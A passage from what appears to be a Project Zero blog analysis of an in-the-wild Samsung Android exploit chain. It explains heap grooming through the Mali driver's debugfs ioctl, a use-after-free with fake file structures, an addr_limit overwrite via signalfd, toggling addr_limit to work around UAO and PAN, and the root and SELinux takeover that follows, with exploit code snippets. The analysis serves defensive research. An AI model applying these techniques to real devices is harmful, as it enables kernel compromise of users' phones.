| /\*\*  \* struct kbase\_ioctl\_mem\_profile\_add - Provide profiling information to kernel  \* @buffer: Pointer to the information  \* @len: Length  \* @padding: Padding  \*  \* The data provided is accessible through a debugfs file  \*/  struct kbase\_ioctl\_mem\_profile\_add {  \_\_u64 buffer;  \_\_u32 len;  \_\_u32 padding;  };    #define KBASE\_ioctl\_MEM\_PROFILE\_ADD \  \_IOW(KBASE\_ioctl\_TYPE, 27, struct kbase\_ioctl\_mem\_profile\_add)    static int kbase\_api\_mem\_profile\_add(struct kbase\_context \*kctx,  struct kbase\_ioctl\_mem\_profile\_add \*data)  {  char \*buf;  int err;    if (data->len > KBASE\_MEM\_PROFILE\_MAX\_BUF\_SIZE) {  dev\_err(kctx->kbdev->dev, "mem\_profile\_add: buffer too big\n");  return -EINVAL;  }    buf = kmalloc(data->len, GFP\_KERNEL);  if (ZERO\_OR\_NULL\_PTR(buf))  return -ENOMEM;    err = copy\_from\_user(buf, u64\_to\_user\_ptr(data->buffer),  data->len);  if (err) {  kfree(buf);  return -EFAULT;  }    return kbasep\_mem\_profile\_debugfs\_insert(kctx, buf, data->len);  } |
| --- |

This ioctl takes a pointer to a buffer, the length of the buffer, and padding as arguments. kbase\_api\_mem\_profile\_add will allocate a buffer on the kernel heap and then will copy the passed buffer from userspace into the newly allocated kernel buffer.

Finally, kbase\_api\_mem\_profile\_add calls kbasep\_mem\_profile\_debugfs\_insert. This technique only works when the device is running a kernel with CONFIG\_DEBUG\_FS enabled. The purpose of the MEM\_PROFILE\_ADD ioctl is to write a buffer to DebugFS. As of Android 11, DebugFS should not be enabled on production devices. Whenever Android launches new requirements like this, it only applies to devices launched on that new version of Android. Android 11 launched in September 2020 and the exploit was found in November 2020 so it makes sense that the exploit targeted devices Android 10 and before where DebugFS would have been mounted.

[![Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs.  The highlighted text reads: &quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&quot;](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png "Screenshot of the DebugFS section from https://source.android.com/docs/setup/about/android-11-release#debugfs.  The highlighted text reads: &quot;Android 11 removes platform support for DebugFS and requires that it not be mounted or accessed on production devices&quot;")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYOnatV5Tbxu0n0Q5oP5HGHvZowemJC_GKvaFf-FAuwlNfx-m5AxwqWU0g5oMMejAoIUcCi10u7pE3n_uuhT3mmfE-7e74_B-ZifuKTmF44asidpw34Gg0jFNAMVKa2i9MsZ6MSGJrN2RayBa3kiPTBc-9JSqhk42W-wjV-IEAYhaQUiZ1hwiVmBpB/s903/image4.png)

For example, on the A51 exynos device (SM-A515F) which launched on Android 10, both CONFIG\_DEBUG\_FS is enabled and DebugFS is mounted.

| a51:/ $ getprop ro.build.fingerprint  samsung/a51nnxx/a51:11/RP1A.200720.012/A515FXXU4DUB1:user/release-keys  a51:/ $ getprop ro.build.version.security\_patch  2021-02-01  a51:/ $ uname -a  Linux localhost 4.14.113-20899478 #1 SMP PREEMPT Mon Feb 1 15:37:03 KST 2021 aarch64  a51:/ $ cat /proc/config.gz | gunzip | cat | grep CONFIG\_DEBUG\_FS  CONFIG\_DEBUG\_FS=y    a51:/ $ cat /proc/mounts | grep debug  /sys/kernel/debug /sys/kernel/debug debugfs rw,seclabel,relatime 0 0 |
| --- |

Because DebugFS is mounted, the exploit is able to use the MEM\_PROFILE\_ADD ioctl to groom the heap. If DebugFS wasn’t enabled or mounted, kbasep\_mem\_profile\_debugfs\_insert would simply free the newly allocated kernel buffer and return.

| #ifdef CONFIG\_DEBUG\_FS    int kbasep\_mem\_profile\_debugfs\_insert(struct kbase\_context \*kctx, char \*data,  size\_t size)  {  int err = 0;    mutex\_lock(&kctx->mem\_profile\_lock);    dev\_dbg(kctx->kbdev->dev, "initialised: %d",  kbase\_ctx\_flag(kctx, KCTX\_MEM\_PROFILE\_INITIALIZED));    if (!kbase\_ctx\_flag(kctx, KCTX\_MEM\_PROFILE\_INITIALIZED)) {  if (IS\_ERR\_OR\_NULL(kctx->kctx\_dentry)) {  err  = -ENOMEM;  } else if (!debugfs\_create\_file("mem\_profile", 0444,  kctx->kctx\_dentry, kctx,  &kbasep\_mem\_profile\_debugfs\_fops)) {  err = -EAGAIN;  } else {  kbase\_ctx\_flag\_set(kctx,  KCTX\_MEM\_PROFILE\_INITIALIZED);  }  }    if (kbase\_ctx\_flag(kctx, KCTX\_MEM\_PROFILE\_INITIALIZED)) {  kfree(kctx->mem\_profile\_data);  kctx->mem\_profile\_data = data;  kctx->mem\_profile\_size = size;  } else {  kfree(data);  }    dev\_dbg(kctx->kbdev->dev, "returning: %d, initialised: %d",  err, kbase\_ctx\_flag(kctx, KCTX\_MEM\_PROFILE\_INITIALIZED));    mutex\_unlock(&kctx->mem\_profile\_lock);    return err;  }      #else /\* CONFIG\_DEBUG\_FS \*/    int kbasep\_mem\_profile\_debugfs\_insert(struct kbase\_context \*kctx, char \*data,  size\_t size)  {  kfree(data);  return 0;  }  #endif /\* CONFIG\_DEBUG\_FS \*/ |
| --- |

By writing the fake file structs as a singular 0x2000 size buffer rather than as 25 individual 0x140 size buffers, the exploit will be writing their fake structs to two whole pages which increases the odds of reallocating over the freed file struct.

The exploit then calls dup2 on the dangling FD’s. The dup2 syscall will open another fd on the same open file structure that the original points to. In this case, the exploit is calling dup2 to verify that they successfully reallocated a fake file structure in the same place as the freed file structure. dup2 will increment the reference count (f\_count) in the file structure. In all of our fake file structures, the f\_count was set to 0x7F. So if any of them are incremented to 0x80, the exploit knows that it successfully reallocated over the freed file struct.

To determine if any of the file struct’s refcounts were incremented, the exploit iterates through each of the directories under /sys/kernel/debug/mali/mem/ and reads each directory’s mem\_profile contents. If it finds the byte 0x80, then it knows that it successfully reallocated the freed struct and that the f\_count of the fake file struct was incremented.

## Overwriting the addr\_limit

Like many previous Android exploits, to gain arbitrary kernel read and write, the exploit overwrites the kernel address limit (addr\_limit). The addr\_limit defines the address range that the kernel may access when dereferencing userspace pointers. For userspace threads, the addr\_limit is usually USER\_DS or 0x7FFFFFFFFF. For kernel threads, it’s usually KERNEL\_DS or 0xFFFFFFFFFFFFFFFF.

Userspace operations only access addresses below the addr\_limit. Therefore, by raising the addr\_limit by overwriting it, we will make kernel memory accessible to our unprivileged process. The exploit uses the syscall signalfd with the dangling fd to do this.

| signalfd(dangling\_fd, 0xFFFFFF8000000000, 8); |
| --- |

According to the [man pages](https://man7.org/linux/man-pages/man2/signalfd.2.html), the syscall signalfd is:

signalfd() creates a file descriptor that can be used to accept signals targeted at the caller.  This provides an alternative to the use of a signal handler or sigwaitinfo(2), and has the advantage that the file descriptor may be monitored by select(2), poll(2), and epoll(7).

| int signalfd(int fd, const sigset\_t \*mask, int flags); |
| --- |

The exploit called signalfd on the file descriptor that was found to replace the freed one in the previous step. When signalfd is called on an existing file descriptor, only the mask is updated based on the mask passed as the argument, which gives the exploit an 8-byte write to the signmask of the signalfd\_ctx struct..

| typedef unsigned long sigset\_t;    struct signalfd\_ctx {  sigset\_t sigmask;  }; |
| --- |

The file struct includes a field called private\_data that is a void \*. File structs for signalfd file descriptors store the pointer to the signalfd\_ctx struct in the private\_data field. As shown above, the signalfd\_ctx struct is simply an 8 byte structure that contains the mask.

Let’s walk through how the signalfd source code updates the mask:

| SYSCALL\_DEFINE4(signalfd4, int, ufd, sigset\_t \_\_user \*, user\_mask,  size\_t, sizemask, int, flags)  {  sigset\_t sigmask;  struct signalfd\_ctx \*ctx;    /\* Check the SFD\_\* constants for consistency.  \*/  BUILD\_BUG\_ON(SFD\_CLOEXEC != O\_CLOEXEC);  BUILD\_BUG\_ON(SFD\_NONBLOCK != O\_NONBLOCK);    if (flags & ~(SFD\_CLOEXEC | SFD\_NONBLOCK))  return -EINVAL;    if (sizemask != sizeof(sigset\_t) ||  copy\_from\_user(&sigmask, user\_mask, sizeof(sigmask)))  return -EINVAL;  sigdelsetmask(&sigmask, sigmask(SIGKILL) | sigmask(SIGSTOP));  signotset(&sigmask);                                      // [1]    if (ufd == -1) {                                          // [2]  ctx = kmalloc(sizeof(\*ctx), GFP\_KERNEL);  if (!ctx)  return -ENOMEM;    ctx->sigmask = sigmask;    /\*  \* When we call this, the initialization must be complete, since  \* anon\_inode\_getfd() will install the fd.  \*/  ufd = anon\_inode\_getfd("[signalfd]", &signalfd\_fops, ctx,  O\_RDWR | (flags & (O\_CLOEXEC | O\_NONBLOCK)));  if (ufd < 0)  kfree(ctx);  } else {                                                 // [3]  struct fd f = fdget(ufd);  if (!f.file)  return -EBADF;  ctx = f.file->private\_data;                      // [4]  if (f.file->f\_op != &signalfd\_fops) {            // [5]  fdput(f);  return -EINVAL;  }  spin\_lock\_irq(&current->sighand->siglock);  ctx->sigmask = sigmask;                         // [6] WRITE!  spin\_unlock\_irq(&current->sighand->siglock);    wake\_up(&current->sighand->signalfd\_wqh);  fdput(f);  }    return ufd;  } |
| --- |

First the function modifies the mask that was passed in. The mask passed into the function is the signals that should be accepted via the file descriptor, but the sigmask member of the signalfd struct represents the signals that should be blocked. The sigdelsetmask and signotset calls at [1] makes this change. The call to sigdelsetmask ensures that the SIG\_KILL and SIG\_STOP signals are always blocked so it clears bit 8 (SIG\_KILL) and bit 18 (SIG\_STOP) in order for them to be set in the next call. Then signotset flips each bit in the mask. The mask that is written is ~(mask\_in\_arg & 0xFFFFFFFFFFFBFEFF).

The function checks whether or not the file descriptor passed in is -1 at [2]. In this exploit’s case it’s not so we fall into the else block at [3]. At [4] the signalfd\_ctx\* is set to the private\_data pointer.

The signalfd manual page also says that the fd argument “[must specify a valid existing signalfd file descriptor](https://man7.org/linux/man-pages/man2/signalfd.2.html#:~:text=If%20fd%20is%20not%20%2D1%2C%20then%20it%20must%20specify%20a%0A%20%20%20%20%20%20%20valid%20existing%20signalfd%20file%20descriptor)”. To verify this, at [5] the syscall checks if the underlying file’s f\_op equals the signalfd\_ops. This is why the f\_op was set to signalfd\_ops in the previous section. Finally at [6], the overwrite occurs. The user provided mask is written to the address in private\_data. In the exploit’s case, the fake file struct’s private\_data was set to the addr\_limit pointer. So when the mask is written, we’re actually overwriting the addr\_limit.

The exploit calls signalfd with a mask argument of 0xFFFFFF8000000000. So the value ~(0xFFFFFF8000000000 & 0xFFFFFFFFFFFCFEFF) = 0x7FFFFFFFFF, also known as USER\_DS. We’ll talk about why they’re overwriting the addr\_limit as USER\_DS rather than KERNEL\_DS in the next section.

## Working Around UAO and PAN

“User-Access Override” (UAO) and “Privileged Access Never” (PAN) are two exploit mitigations that are commonly found on modern Android devices. Their kernel configs are CONFIG\_ARM64\_UAO and CONFIG\_ARM64\_PAN. Both PAN and UAO are hardware mitigations released on ARMv8 CPUs. PAN protects against the kernel directly accessing user-space memory. UAO works with PAN by allowing unprivileged load and store instructions to act as privileged load and store instructions when the UAO bit is set.

It’s often said that the addr\_limit overwrite technique detailed above doesn’t work on devices with UAO and PAN turned on. The commonly used addr\_limit overwrite technique was to change the addr\_limit to a very high address, like 0xFFFFFFFFFFFFFFFF (KERNEL\_DS), and then use a pair of pipes for arbitrary kernel read and write. This is what Jann and I did in our [proof-of-concept for CVE-2019-2215](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885#176) back in 2019. Our kernel\_write function is shown below.

| void kernel\_write(unsigned long kaddr, void \*buf, unsigned long len) {  errno = 0;  if (len > 0x1000) errx(1, "kernel writes over PAGE\_SIZE are messy, tried 0x%lx", len);  if (write(kernel\_rw\_pipe[1], buf, len) != len) err(1, "kernel\_write failed to load userspace buffer");  if (read(kernel\_rw\_pipe[0], (void\*)kaddr, len) != len) err(1, "kernel\_write failed to overwrite kernel memory");  } |
| --- |

This technique works by first writing the pointer to the buffer of the contents that you’d like written to one end of the pipe. By then calling a read and passing in the kernel address you’d like to write to, those contents are then written to that kernel memory address.

With UAO and PAN enabled, if the addr\_limit is set to KERNEL\_DS and we attempt to execute this function, the first write call will fail because buf is in user-space memory and PAN prevents the kernel from accessing user space memory.

Let’s say we didn’t set the addr\_limit to KERNEL\_DS (-1) and instead set it to -2, a high kernel address that’s not KERNEL\_DS. PAN wouldn’t be enabled, but neither would UAO. Without UAO enabled, the unprivileged load and store instructions are not able to access the kernel memory.

The way the exploit works around the constraints of UAO and PAN is pretty straightforward: the exploit switches the addr\_limit between USER\_DS and KERNEL\_DS based on whether it needs to access user space or kernel space memory. As shown in the uao\_thread\_switch function below, UAO is enabled when addr\_limit == KERNEL\_DS and is disabled when it does not.

| /\* Restore the UAO state depending on next's addr\_limit \*/  void uao\_thread\_switch(struct task\_struct \*next)  {  if (IS\_ENABLED(CONFIG\_ARM64\_UAO)) {  if (task\_thread\_info(next)->addr\_limit == KERNEL\_DS)  asm(ALTERNATIVE("nop", SET\_PSTATE\_UAO(1), ARM64\_HAS\_UAO));  else  asm(ALTERNATIVE("nop", SET\_PSTATE\_UAO(0), ARM64\_HAS\_UAO));  }  } |
| --- |

The exploit was able to use this technique of toggling the addr\_limit between USER\_DS and KERNEL\_DS because they had such a good primitive from the use-after-free and could reliably and repeatedly write a new value to the addr\_limit by calling signalfd. The exploit’s function to write to kernel addresses is shown below:

| kernel\_write(void \*kaddr, const void \*buf, unsigned long buf\_len)  {  unsigned long USER\_DS = 0x7FFFFFFFFF;  write(kernel\_rw\_pipe2, buf, buf\_len);                   // [1]  write(kernel\_rw\_pipe2, &USER\_DS, 8u);                   // [2]  set\_addr\_limit\_to\_KERNEL\_DS();                          // [3]  read(kernel\_rw\_pipe, kaddr, buf\_len);                   // [4]  read(kernel\_rw\_pipe, addr\_limit\_ptr, 8u);               // [5]  } |
| --- |

The function takes three arguments: the kernel address to write to (kaddr), a pointer to the buffer of contents to write (buf), and the length of the buffer (buf\_len). buf is in userspace. When the kernel\_write function is entered, the addr\_limit is currently set to USER\_DS. At [1] the exploit writes the buffer pointer to the pipe. A pointer to the USER\_DS value is written to the pipe at [2].

The set\_addr\_limit\_to\_KERNEL\_DS function at [3] sends a signal to tell another process in the exploit to call signalfd with a mask of 0. Because signalfd performs a NOT on the bits provided in the mask in signotset, the value 0xFFFFFFFFFFFFFFFF (KERNEL\_DS) is written to the addr\_limit.

Now that the addr\_limit is set to KERNEL\_DS the exploit can access kernel memory. At [4], the exploit reads from the pipe, writing the contents to kaddr. Then at [5] the exploit returns addr\_limit back to USER\_DS by reading the value from the pipe that was written at [2] and writing it back to the addr\_limit. The exploit’s function to read from kernel memory is the mirror image of this function.

I deliberately am not calling this a bypass because UAO and PAN are acting exactly as they were designed to act: preventing the kernel from accessing user-space memory. UAO and PAN were not developed to protect against arbitrary write access to the addr\_limit.

## Post-exploitation

The exploit now has arbitrary kernel read and write. It then follows the steps as seen in most other Android exploits: overwrite the cred struct for the current process and overwrite the loaded SELinux policy to change the current process’s context to vold. vold is the “Volume Daemon” which is responsible for mounting and unmounting of external storage. vold runs as root and while it's a userspace service, it’s considered kernel-equivalent as described in the [Android documentation on security contexts](https://source.android.com/docs/security/overview/updates-resources#process_types). Because it’s a highly privileged security context, it makes a prime target for changing the SELinux context to.

[![Screen shot of the &quot;OS Kernel&quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says:  Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that's considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold).](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png "Screen shot of the &quot;OS Kernel&quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says:  Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that's considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold).")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png)

As stated at the beginning of this post, the sample obtained was discovered in the preparatory stages of the attack. Unfortunately, it did not include the final payload that would have been deployed with this exploit.

# Conclusion

This in-the-wild exploit chain is a great example of different attack surfaces and “shape” than many of the Android exploits we’ve seen in the past. All three vulnerabilities in this chain were in the manufacturer’s custom components rather than in the AOSP platform or the Linux kernel. It’s also interesting to note that 2 out of the 3 vulnerabilities were logic and design vulnerabilities rather than memory safety. Of the [10 other Android in-the-wild 0-days](https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1190662839) that we’ve tracked since mid-2014, only 2 of those were not memory corruption vulnerabilities.

The first vulnerability in this chain, the arbitrary file read and write, CVE-2021-25337, was the foundation of this chain, used 4 different times and used at least once in each step. The vulnerability was in the Java code of a custom content provider in the system\_server. The Java components in Android devices don’t tend to be the most popular targets for security researchers despite it running at such a privileged level. This highlights an area for further research.

Labeling when vulnerabilities are known to be exploited in-the-wild is important both for targeted users and for the security industry. When in-the-wild 0-days are not transparently disclosed, we are not able to use that information to further protect users, using patch analysis and variant analysis, to gain an understanding of what attackers already know.

The analysis of this exploit chain has provided us with new and important insights into how attackers are targeting Android devices. It highlights a need for more research into manufacturer specific components. It shows where we ought to do further variant analysis. It is a good example of how Android exploits can take many different “shapes” and so brainstorming different detection ideas is a worthwhile exercise. But in this case, we’re at least 18 months behind the attackers: they already know which bugs they’re exploiting and so when this information is not shared transparently, it leaves defenders at a further disadvantage.

This transparent disclosure of in-the-wild status is necessary for both the safety and autonomy of targeted users to protect themselves as well as the security industry to work together to best prevent these 0-days in the future.

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[8:50 AM](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=5910791167813767823&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5910791167813767823&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5910791167813767823&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5910791167813767823&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5910791167813767823&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5910791167813767823&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2023-01-12T08:59:00-08:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2022-11-04T08:50:00-07:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ▼
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ▼
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
    - [Mind the Gap](https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html)
    - [A Very Powerful Clipboard: Analysis of a Samsung i...](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html)
    - [Gregor Samsa: Exploiting Java's XML Signature Veri...](https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from www.blogger.com_979726ce_20250115_225529.html ===

# Sign in

